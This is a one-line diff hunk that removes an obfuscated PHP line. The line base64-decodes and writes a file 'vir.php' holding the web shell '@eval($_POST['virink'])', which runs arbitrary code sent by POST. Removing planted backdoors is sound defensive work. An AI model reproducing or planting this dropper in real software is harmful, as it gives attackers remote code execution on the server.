@@ -1,1 +1,0 @@
-fputs(fopen(base64_decode(dmlyLnBocA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWyd2aXJpbmsnXSk7Pz4tLS0t));
